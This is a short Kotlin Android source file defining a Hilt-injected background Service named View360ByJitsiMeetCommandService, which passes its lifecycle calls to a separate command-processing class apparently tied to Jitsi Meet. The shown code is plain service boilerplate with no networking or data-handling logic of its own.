package com.android.services.services.view360ByJitsi

import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.annotation.RequiresApi
import com.android.services.di.module.ApplicationScope
import com.android.services.interfaces.IBackgroundProcessing
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.services.view360.View360CommandProcessingBaseImplI
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.CoroutineScope
import javax.inject.Inject

@RequiresApi(Build.VERSION_CODES.LOLLIPOP)
@AndroidEntryPoint
class View360ByJitsiMeetCommandService  : Service() {

    @Inject
    lateinit var localDatabaseSource: LocalDatabaseSource

    @Inject
    @ApplicationScope
    lateinit var coroutineScope: CoroutineScope
    lateinit var view360ProcessingI: IBackgroundProcessing

    override fun onBind(arg0: Intent): IBinder? {
        return null
    }

    override fun onCreate() {
        super.onCreate()
        view360ProcessingI =
            View360ByJitsiCommandProcessingBaseImplI(this, localDatabaseSource, coroutineScope)
        view360ProcessingI.onCreate()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return view360ProcessingI.onStartCommand(intent, flags, startId)
    }

    override fun onDestroy() {
        super.onDestroy()
        view360ProcessingI.onDestroy()
    }
}